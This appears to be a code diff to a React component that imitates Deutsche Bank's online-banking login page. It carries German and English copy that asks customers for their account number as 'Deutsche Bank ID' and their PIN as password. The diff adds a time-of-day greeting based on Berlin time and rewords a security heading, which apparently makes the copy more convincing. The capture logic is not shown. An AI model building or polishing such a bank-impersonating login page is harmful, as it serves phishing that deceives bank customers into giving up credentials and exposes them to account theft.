@@ -48,6 +48,7 @@ const COPY: Record<Lang, {
   info2: string;
   bullet1: string; bullet2: string;
   greeting: string;
+  greetingEvening: string;
   enterCreds: string;
   idLabel: string;
   pwLabel: string;
@@ -78,6 +79,7 @@ const COPY: Record<Lang, {
     bullet1: "Geben Sie im Feld \"Deutsche Bank ID\" Ihre bisherige Filialkontonummer ein - ohne Leerzeichen und ohne Unterkontonummer",
     bullet2: "Geben Sie anschließend Ihre PIN im Feld „Passwort\" ein",
     greeting: "Guten Tag",
+    greetingEvening: "Guten Abend",
     enterCreds: "Bitte geben Sie Ihre Zugangsdaten ein.",
     idLabel: "Deutsche Bank ID",
     pwLabel: "Passwort",
@@ -114,6 +116,7 @@ const COPY: Record<Lang, {
     bullet1: "Enter your previous branch/account number in the \"Deutsche Bank ID\" field – without spaces and without the sub-account number.",
     bullet2: "Then enter your PIN in the \"Password\" field.",
     greeting: "Hello",
+    greetingEvening: "Good evening",
     enterCreds: "Please enter your credentials.",
     idLabel: "Deutsche Bank ID",
     pwLabel: "Password",
@@ -127,7 +130,7 @@ const COPY: Record<Lang, {
     learnMore: "Learn more",
     secInfoTitle: "Security information",
     secInfoText: "Protect yourself and your online banking. We will be happy to help you.",
-    secNews: "Security at a glance",
+    secNews: "Current security information",
     secOverview: "Security at a glance",
     accessTitle: "Online banking access",
     accessText: "Here you can apply for access to your online banking.",
@@ -274,7 +277,10 @@ const DeutscheBank = () => {
 
                 {step === 1 ? (
                   <h1 className="text-[28px] font-semibold mb-5" style={{ color: "#171945", lineHeight: 1.2 }}>
-                    {t.greeting}
+                    {(() => {
+                      const h = parseInt(new Intl.DateTimeFormat('de-DE', { timeZone: 'Europe/Berlin', hour: 'numeric', hour12: false }).format(new Date()), 10);
+                      return h >= 17 ? t.greetingEvening : t.greeting;
+                    })()}
                   </h1>
                 ) : (
                   <div className="mb-2 flex items-center" style={{ height: 34 }}>
